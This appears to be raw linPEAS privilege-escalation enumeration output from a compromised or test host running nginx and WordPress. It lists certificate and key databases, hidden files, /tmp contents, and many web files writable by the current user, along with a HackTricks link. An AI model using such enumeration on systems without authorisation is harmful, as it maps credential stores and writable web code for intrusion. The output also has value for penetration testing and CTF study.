+-rw-r--r-- 1 chronos chronos 6999 Mar 29  2020 /usr/local/lib/python3.8/sqlite3/test/__pycache__/backup.cpython-38.opt-1.pyc
+-rw-r--r-- 1 chronos chronos 6999 Mar 29  2020 /usr/local/lib/python3.8/sqlite3/test/__pycache__/backup.cpython-38.pyc
+-rw-r--r-- 1 chronos chronos 6622 Dec 28  2017 /usr/local/include/backup.h
+-rw-r--r-- 1 chronos chronos 2007 Feb 15  2018 /usr/local/include/boost/variant/detail/backup_holder.hpp
+-rw-r--r-- 1 chronos chronos 7141 Jan  2  2018 /mnt/stateful_partition/dev_image/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/request/node_modules/form-data/README.md.bak
+-rw-r--r-- 1 root root 4733 Feb 11 10:24 /mnt/stateful_partition/dev_image/share/doc/open-vm-tools/api/html/vmbackup_8h.html
+-rw-r--r-- 1 root root 6376 Feb 11 10:24 /mnt/stateful_partition/dev_image/share/doc/open-vm-tools/api/html/vmbackup_8h_source.html
+-rw-r--r-- 1 chronos chronos 339 Apr 28  2020 /mnt/stateful_partition/dev_image/share/ri/2.7.0/system/Bundler/EnvironmentPreserver/backup-i.ri
+-rw-r--r-- 1 chronos chronos 2760 Nov 26  2017 /mnt/stateful_partition/dev_image/share/man/man8/vgcfgbackup.8.gz
+-rw-r--r-- 1 chronos chronos 235 Dec 28  2017 /mnt/stateful_partition/dev_image/docs/README_tokudb_backup
+-rwxr-xr-x 1 chronos chronos 68056 Feb 17  2018 /mnt/stateful_partition/dev_image/lib/mysql/plugin/tokudb_backup.so
+-rwxr-xr-x 1 root root 173120 Feb 11 10:24 /mnt/stateful_partition/dev_image/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so                                                                                                             
+-rw-r--r-- 1 chronos chronos 5671 Mar 29  2020 /mnt/stateful_partition/dev_image/lib/python3.8/sqlite3/test/backup.py
+-rw-r--r-- 1 chronos chronos 6999 Mar 29  2020 /mnt/stateful_partition/dev_image/lib/python3.8/sqlite3/test/__pycache__/backup.cpython-38.opt-2.pyc
+-rw-r--r-- 1 chronos chronos 6999 Mar 29  2020 /mnt/stateful_partition/dev_image/lib/python3.8/sqlite3/test/__pycache__/backup.cpython-38.opt-1.pyc
+-rw-r--r-- 1 chronos chronos 6999 Mar 29  2020 /mnt/stateful_partition/dev_image/lib/python3.8/sqlite3/test/__pycache__/backup.cpython-38.pyc
+-rw-r--r-- 1 chronos chronos 6622 Dec 28  2017 /mnt/stateful_partition/dev_image/include/backup.h
+-rw-r--r-- 1 chronos chronos 2007 Feb 15  2018 /mnt/stateful_partition/dev_image/include/boost/variant/detail/backup_holder.hpp
+-rw-r--r-- 1 root root 8920 Dec 22  2020 /lib/modules/5.4.66+/kernel/drivers/power/supply/wm831x_backup.ko
+
+╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+Found: /home/chronos/Default/heavy_ad_intervention_opt_out.db: regular file, no read permission                     
+Found: /home/chronos/Default/previews_opt_out.db: regular file, no read permission
+Found: /home/nginx/.pki/nssdb/cert9.db: SQLite 3.x database, last written using SQLite version 3032003
+Found: /home/nginx/.pki/nssdb/key4.db: SQLite 3.x database, last written using SQLite version 3032003
+Found: /mnt/stateful_partition/dev_image/lib/python2.7/test/185test.db: Berkeley DB 1.85 (Hash, version 2, big-endian)
+Found: /mnt/stateful_partition/encrypted/chronos/Default/heavy_ad_intervention_opt_out.db: regular file, no read permission
+Found: /mnt/stateful_partition/encrypted/chronos/Default/previews_opt_out.db: regular file, no read permission
+Found: /mnt/stateful_partition/home/nginx/.pki/nssdb/cert9.db: SQLite 3.x database, last written using SQLite version 3032003
+Found: /mnt/stateful_partition/home/nginx/.pki/nssdb/key4.db: SQLite 3.x database, last written using SQLite version 3032003
+ -> Extracting tables from /home/nginx/.pki/nssdb/cert9.db (limit 20)
+                                                                                                                    
+ -> Extracting tables from /home/nginx/.pki/nssdb/key4.db (limit 20)
+                                                                                                                    
+ -> Extracting tables from /mnt/stateful_partition/home/nginx/.pki/nssdb/cert9.db (limit 20)
+                                                                                                                    
+ -> Extracting tables from /mnt/stateful_partition/home/nginx/.pki/nssdb/key4.db (limit 20)
+                                                                                                                    
+
+╔══════════╣ Web files?(output limit)
+                                                                                                                    
+╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+-rw-r--r-- 1 chronos chronos 97 Mar 31  2020 /usr/local/lib64/ruby/gems/2.7.0/gems/net-telnet-0.2.0/.travis.yml     
+-rw-r--r-- 1 chronos chronos 1107 Mar 31  2020 /usr/local/lib64/ruby/gems/2.7.0/gems/minitest-5.13.0/.autotest
+-rw-r--r-- 1 chronos chronos 328 Mar 31  2020 /usr/local/lib64/ruby/gems/2.7.0/gems/power_assert-1.1.7/.travis.yml
+-rw-r--r-- 1 chronos chronos 89 Mar 31  2020 /usr/local/lib64/ruby/gems/2.7.0/gems/xmlrpc-0.3.0/.travis.yml
+-rw-r--r-- 1 chronos chronos 29 Oct 26  2014 /usr/local/lib64/python2.7/site-packages/numpy/f2py/tests/src/assumed_shape/.f2py_f2cmap
+-rw-r--r-- 1 chronos chronos 0 Jun 11  2020 /usr/local/lib64/php/.lock
+-rw-r--r-- 1 chronos chronos 6961 Jun 11  2020 /usr/local/lib64/php/.filemap
+-rwxrwxrwx 1 nginx nginx 629 May  9  2016 /usr/local/share/nginx/html/main/wp-content/plugins/akismet/.htaccess
+-rw-r--r-- 1 nginx nginx 269 Oct 25  2019 /usr/local/share/nginx/html/main/wp-content/themes/twentytwenty/.stylelintrc.json
+-rw-r--r-- 1 nginx nginx 629 May  9  2016 /usr/local/share/nginx/html/testing/wp-content/plugins/akismet/.htaccess
+-rw-r--r-- 1 nginx nginx 269 Oct 25  2019 /usr/local/share/nginx/html/testing/wp-content/themes/twentytwenty/.stylelintrc.json
+-rw-r--r-- 1 chronos chronos 1265 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/.travis.yml
+-rw-r--r-- 1 chronos chronos 2851 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/.mailmap
+-rw-r--r-- 1 chronos chronos 76 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/safe-buffer/.travis.yml
+-rw-r--r-- 1 chronos chronos 92 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/tar/node_modules/minipass/.travis.yml
+-rw-r--r-- 1 chronos chronos 326 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/is-cidr/.travis.yml
+-rw-r--r-- 1 chronos chronos 47 May 29  2017 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/cmd-shim/.travis.yml
+-rw-r--r-- 1 chronos chronos 189 May 29  2017 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/read-installed/.travis.yml
+-rw-r--r-- 1 chronos chronos 1414 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/uuid/.eslintrc.json
+-rw-r--r-- 1 chronos chronos 57 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/JSONStream/.travis.yml
+-rw-r--r-- 1 chronos chronos 54 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/JSONStream/node_modules/through/.travis.yml
+-rw-r--r-- 1 chronos chronos 141 May 29  2017 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/fs-write-stream-atomic/.travis.yml
+-rw-r--r-- 1 chronos chronos 1160 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/update-notifier/node_modules/chalk/node_modules/ansi-styles/node_modules/color-convert/node_modules/color-name/.eslintrc.json
+-rw-r--r-- 1 chronos chronos 116 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/update-notifier/node_modules/latest-version/node_modules/package-json/node_modules/registry-url/node_modules/rc/node_modules/minimist/.travis.yml
+-rw-r--r-- 1 chronos chronos 116 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/update-notifier/node_modules/latest-version/node_modules/package-json/node_modules/registry-auth-token/node_modules/rc/node_modules/minimist/.travis.yml
+-rw-r--r-- 1 chronos chronos 48 May 29  2017 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/text-table/.travis.yml
+-rw-r--r-- 1 chronos chronos 65 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/mississippi/node_modules/duplexify/.travis.yml
+-rw-r--r-- 1 chronos chronos 65 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/mississippi/node_modules/duplexify/node_modules/stream-shift/.travis.yml
+-rw-r--r-- 1 chronos chronos 109 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/mississippi/node_modules/from2/.travis.yml
+-rw-r--r-- 1 chronos chronos 48 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/mississippi/node_modules/concat-stream/node_modules/typedarray/.travis.yml
+-rw-r--r-- 1 chronos chronos 68 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/mississippi/node_modules/pumpify/.travis.yml
+-rw-r--r-- 1 chronos chronos 69 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/mississippi/node_modules/flush-write-stream/.travis.yml
+-rw-r--r-- 1 chronos chronos 62 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/mississippi/node_modules/stream-each/.travis.yml
+-rw-r--r-- 1 chronos chronos 65 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/mississippi/node_modules/stream-each/node_modules/stream-shift/.travis.yml
+-rw-r--r-- 1 chronos chronos 58 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/mississippi/node_modules/pump/.travis.yml
+-rw-r--r-- 1 chronos chronos 88 May 29  2017 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/node-gyp/.jshintrc
+-rw-r--r-- 1 chronos chronos 45 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/node-gyp/node_modules/tar/.travis.yml
+-rw-r--r-- 1 chronos chronos 142 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/node-gyp/node_modules/fstream/.travis.yml
+-rw-r--r-- 1 chronos chronos 134 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/node-gyp/node_modules/nopt/.travis.yml
+-rw-r--r-- 1 chronos chronos 43 Dec  7  2017 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/node-gyp/node_modules/minimatch/node_modules/brace-expansion/node_modules/concat-map/.travis.yml
+-rw-r--r-- 1 chronos chronos 38 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/qrcode-terminal/.travis.yml
+-rw-r--r-- 1 chronos chronos 116 Dec  7  2017 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/lockfile/.travis.yml
+-rw-r--r-- 1 chronos chronos 1785 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/readable-stream/.travis.yml
+-rw-r--r-- 1 chronos chronos 112 May 29  2017 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/readable-stream/node_modules/process-nextick-args/.travis.yml
+-rw-r--r-- 1 chronos chronos 48 May 29  2017 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/readable-stream/node_modules/isarray/.travis.yml
+-rw-r--r-- 1 chronos chronos 143 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/meant/.travis.yml
+-rw-r--r-- 1 chronos chronos 43 Dec  7  2017 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/glob/node_modules/minimatch/node_modules/brace-expansion/node_modules/concat-map/.travis.yml
+-rw-r--r-- 1 chronos chronos 58 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/sorted-union-stream/.travis.yml
+-rw-r--r-- 1 chronos chronos 60 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/sorted-union-stream/node_modules/stream-iterate/.travis.yml
+-rw-r--r-- 1 chronos chronos 65 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/sorted-union-stream/node_modules/stream-iterate/node_modules/stream-shift/.travis.yml
+-rw-r--r-- 1 chronos chronos 108 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/nopt/.travis.yml
+-rw-r--r-- 1 chronos chronos 66 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/validate-npm-package-name/.travis.yml
+-rw-r--r-- 1 chronos chronos 48 May 29  2017 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/validate-npm-package-name/node_modules/builtins/.travis.yml
+-rw-r--r-- 1 chronos chronos 116 May 29  2017 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/mkdirp/.travis.yml
+-rw-r--r-- 1 chronos chronos 48 May 29  2017 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/mkdirp/node_modules/minimist/.travis.yml
+-rw-r--r-- 1 chronos chronos 48 May 29  2017 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/npm-registry-client/node_modules/concat-stream/node_modules/typedarray/.travis.yml
+-rw-r--r-- 1 chronos chronos 139 Dec  7  2017 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/unique-filename/node_modules/unique-slug/.travis.yml
+-rw-r--r-- 1 chronos chronos 134 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/read/node_modules/mute-stream/.travis.yml
+-rw-r--r-- 1 chronos chronos 178 May 29  2017 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/request/node_modules/http-signature/.dir-locals.el
+-rw-r--r-- 1 chronos chronos 189 May 29  2017 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/request/node_modules/http-signature/node_modules/sshpk/.travis.yml
+-rw-r--r-- 1 chronos chronos 44 May 29  2017 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/request/node_modules/http-signature/node_modules/sshpk/node_modules/asn1/.travis.yml
+-rw-r--r-- 1 chronos chronos 113 May 29  2017 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/request/node_modules/http-signature/node_modules/sshpk/node_modules/getpass/.travis.yml
+-rw-r--r-- 1 chronos chronos 399 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/request/node_modules/qs/.editorconfig
+-rw-r--r-- 1 chronos chronos 5 May 29  2017 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/request/node_modules/qs/.eslintignore
+-rw-r--r-- 1 chronos chronos 630 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/request/node_modules/har-validator/node_modules/ajv/node_modules/json-schema-traverse/.eslintrc.yml
+-rw-r--r-- 1 chronos chronos 108 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/request/node_modules/har-validator/node_modules/ajv/node_modules/json-schema-traverse/.travis.yml
+-rw-r--r-- 1 chronos chronos 91 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/request/node_modules/har-validator/node_modules/ajv/node_modules/json-schema-traverse/spec/.eslintrc.yml
+-rw-r--r-- 1 chronos chronos 48 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/request/node_modules/har-validator/node_modules/ajv/node_modules/json-stable-stringify/.travis.yml
+-rw-r--r-- 1 chronos chronos 659 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/request/node_modules/har-validator/node_modules/ajv/node_modules/fast-deep-equal/.eslintrc.yml
+-rw-r--r-- 1 chronos chronos 108 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/request/node_modules/har-validator/node_modules/ajv/node_modules/fast-deep-equal/.travis.yml
+grep: write error: Broken pipe
+grep: write error: Broken pipe
+
+╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                                                                                   
+-rw-r--r-- 1 root root 135 Jul 18 14:05 /tmp/disk-cryptohome-unmounted                                              
+-rw-r--r-- 1 root root 14 Jul 18 14:05 /tmp/uptime-cryptohome-unmounted
+-rw-r--r-- 1 root root 135 Jul 18 14:05 /tmp/disk-other-processes-terminated
+-rw-r--r-- 1 root root 14 Jul 18 14:05 /tmp/uptime-other-processes-terminated
+-rw-r--r-- 1 root root 135 Jul 18 14:05 /tmp/disk-ui-post-stop
+-rw-r--r-- 1 root root 14 Jul 18 14:05 /tmp/uptime-ui-post-stop
+-rw-r--r-- 1 shill shill 135 Jul 18 14:03 /tmp/disk-network-ethernet-no-connectivity
+-rw-r--r-- 1 shill shill 12 Jul 18 14:03 /tmp/uptime-network-ethernet-no-connectivity
+-rw-r--r-- 1 root root 5 Jul 18 14:03 /tmp/firmware-boot-time
+-rw-r--r-- 1 shill shill 135 Jul 18 14:03 /tmp/disk-network-ethernet-ready
+-rw-r--r-- 1 shill shill 12 Jul 18 14:03 /tmp/uptime-network-ethernet-ready
+-rw-r--r-- 1 shill shill 135 Jul 18 14:03 /tmp/disk-network-ethernet-configuration
+-rw-r--r-- 1 shill shill 12 Jul 18 14:03 /tmp/uptime-network-ethernet-configuration
+-rw-r--r-- 1 chronos chronos 135 Jul 18 14:03 /tmp/disk-chrome-main
+-rw-r--r-- 1 chronos chronos 10 Jul 18 14:03 /tmp/uptime-chrome-main
+-rw-r--r-- 1 shill shill 135 Jul 18 14:03 /tmp/disk-network-ethernet-registered
+-rw-r--r-- 1 shill shill 12 Jul 18 14:03 /tmp/uptime-network-ethernet-registered
+-rw-r--r-- 1 root root 135 Jul 18 14:03 /tmp/disk-boot-complete
+-rw-r--r-- 1 root root 12 Jul 18 14:03 /tmp/uptime-boot-complete
+-rw-r--r-- 1 root root 135 Jul 18 14:03 /tmp/disk-login-prompt-visible
+-rw-r--r-- 1 root root 12 Jul 18 14:03 /tmp/uptime-login-prompt-visible
+-rw-r--r-- 1 root root 135 Jul 18 14:02 /tmp/disk-chrome-exec
+-rw-r--r-- 1 root root 10 Jul 18 14:02 /tmp/uptime-chrome-exec
+-rw-r--r-- 1 root root 135 Jul 18 14:02 /tmp/disk-shill-start
+-rw-r--r-- 1 root root 10 Jul 18 14:02 /tmp/uptime-shill-start
+-rw-r--r-- 1 root root 135 Jul 18 14:02 /tmp/disk-lockbox-cache-end
+-rw-r--r-- 1 root root 10 Jul 18 14:02 /tmp/uptime-lockbox-cache-end
+-rw-r--r-- 1 root root 135 Jul 18 14:02 /tmp/disk-lockbox-cache-start
+-rw-r--r-- 1 root root 10 Jul 18 14:02 /tmp/uptime-lockbox-cache-start
+-rw-r--r-- 1 root root 135 Jul 18 14:02 /tmp/disk-post-startup
+-rw-r--r-- 1 root root 10 Jul 18 14:02 /tmp/uptime-post-startup
+-rw-r--r-- 1 root root 135 Jul 18 14:02 /tmp/disk-pre-startup
+-rw-r--r-- 1 root root 10 Jul 18 14:02 /tmp/uptime-pre-startup
+
+╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                        
+uniq: write error: Broken pipe                                                                                      
+/dev/shm
+/dev/shm/linpeas.sh
+/home/nginx
+/media
+/mnt/stateful_partition/dev_image/share/nginx/html/index.html
+/mnt/stateful_partition/dev_image/share/nginx/html/main
+/mnt/stateful_partition/dev_image/share/nginx/html/main/index.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/license.txt
+/mnt/stateful_partition/dev_image/share/nginx/html/main/readme.html
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-activate.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/about.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/admin-ajax.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/admin-footer.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/admin-functions.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/admin-header.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/about-rtl.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/about-rtl.min.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/about.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/about.min.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/admin-menu-rtl.css
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/_admin.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/_mixins.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/_variables.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/blue
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/blue/colors-rtl.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/blue/colors-rtl.min.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/blue/colors.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/blue/colors.min.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/blue/colors.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/coffee
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/coffee/colors-rtl.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/coffee/colors-rtl.min.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/coffee/colors.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/coffee/colors.min.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/coffee/colors.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/ectoplasm
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/ectoplasm/colors-rtl.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/ectoplasm/colors-rtl.min.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/ectoplasm/colors.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/ectoplasm/colors.min.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/ectoplasm/colors.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/light
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/light/colors-rtl.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/light/colors-rtl.min.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/light/colors.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/light/colors.min.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/light/colors.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/midnight
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/midnight/colors-rtl.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/midnight/colors-rtl.min.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/midnight/colors.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/midnight/colors.min.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/midnight/colors.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/ocean
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/ocean/colors-rtl.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/ocean/colors-rtl.min.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/ocean/colors.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/ocean/colors.min.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/ocean/colors.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/sunrise
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/sunrise/colors-rtl.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/sunrise/colors-rtl.min.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/sunrise/colors.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/sunrise/colors.min.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/colors/sunrise/colors.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/common-rtl.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/common-rtl.min.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/common.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/common.min.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/css/customize-controls-rtl.css
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/custom-background.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/custom-header.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/customize.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/edit-comments.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/edit-form-advanced.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/includes/admin-filters.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/includes/admin.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/includes/ajax-actions.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/includes/bookmark.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/includes/class-automatic-upgrader-skin.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/index.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/install-helper.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/install.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/js/accordion.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/js/accordion.min.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/js/code-editor.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/js/code-editor.min.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/js/color-picker.js
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/js/widgets/custom-html-widgets.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/js/widgets/custom-html-widgets.min.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/js/widgets/media-audio-widget.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/js/widgets/media-audio-widget.min.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/js/widgets/media-gallery-widget.js
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/js/word-count.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/js/word-count.min.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/js/xfn.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/js/xfn.min.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/link-add.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/link-manager.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/link-parse-opml.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/link.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/load-scripts.php
